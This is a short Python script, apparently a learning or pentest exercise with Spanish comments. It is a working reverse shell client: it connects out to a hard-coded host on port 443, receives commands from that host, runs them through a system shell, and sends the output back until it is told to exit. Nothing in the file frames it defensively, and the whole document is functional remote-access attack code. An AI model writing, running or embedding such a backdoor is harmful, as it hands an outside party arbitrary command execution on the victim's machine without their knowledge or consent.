#!/usr/bin/env python3

import socket
import subprocess
import sys


def run_command(command):
    try:
        command_output = subprocess.check_output(command, shell=True)
        return command_output.decode("cp850")
    except Exception as e:
        return f"\n[!] Error: {e}\n\n"


if __name__ == "__main__":
    # NOTE: Creating socket client
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # NOTE: inicia conexion a la IP y puerto 443
    client_socket.connect(("192.168.100.41", 443))
    # NOTE: send message to server
    client_socket.send(b"\n[+] Conexion establecida...\n")
    client_socket.send(b'[+] Type "Exit" for quit or ctrl + c\n')
    while True:
        # NOTE:  Receiving from server
        command = client_socket.recv(1024).decode().strip()
        print(f"Comando recibido: {command}")
        if command != "Exit":
            command_output = run_command(command)
            print(f"Comando Output: {command_output}")
            client_socket.send(command_output.encode())
        else:
            client_socket.close()
            sys.exit(1)
